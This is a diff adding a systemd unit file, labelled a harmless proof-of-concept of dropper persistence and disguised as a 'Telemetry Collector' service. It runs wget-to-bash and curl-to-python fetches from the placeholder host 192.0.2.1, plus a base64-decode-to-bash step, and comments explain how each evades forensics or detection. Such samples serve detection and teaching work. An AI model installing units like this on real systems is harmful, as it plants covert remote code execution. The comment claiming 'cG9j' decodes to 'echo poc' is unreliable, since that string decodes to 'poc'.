@@ -1,0 +1,38 @@
+# ============================================================
+# POC: Download-and-execute systemd service — harmless sample
+# Simulates a supply-chain or dropper persistence mechanism.
+# URL is RFC 5737 TEST-NET — routable nowhere, no real request made.
+# ============================================================
+
+[Unit]
+Description=Telemetry Collector
+# "Telemetry Collector", "Metrics Agent", "Health Monitor" are
+# common disguise names used in the wild.
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=oneshot
+# 'oneshot' runs once — paired with a timer unit it mimics a cron job
+# but lives inside the more trusted systemd namespace.
+
+# --- Technique 1: wget piped to bash in a service ---
+# Severity: HIGH
+# Downloads a remote script and pipes it straight to bash.
+# No temporary file is written — harder to spot in filesystem forensics.
+ExecStart=/bin/bash -c "wget http://192.0.2.1/metrics.sh | bash"
+
+# --- Technique 2: curl piped to python ---
+# Severity: HIGH
+# Python is often available and lets the attacker run arbitrary code
+# without writing a file to disk.
+ExecStartPre=/bin/bash -c "curl http://192.0.2.1/agent.py | python"
+
+# --- Technique 3: base64 decode and execute ---
+# Severity: HIGH
+# Obfuscated command that survives basic grep-based detection.
+# The sample base64 below decodes to the harmless string "echo poc".
+ExecStartPost=/bin/bash -c "echo cG9j | base64 -d | bash"
+
+[Install]
+WantedBy=multi-user.target
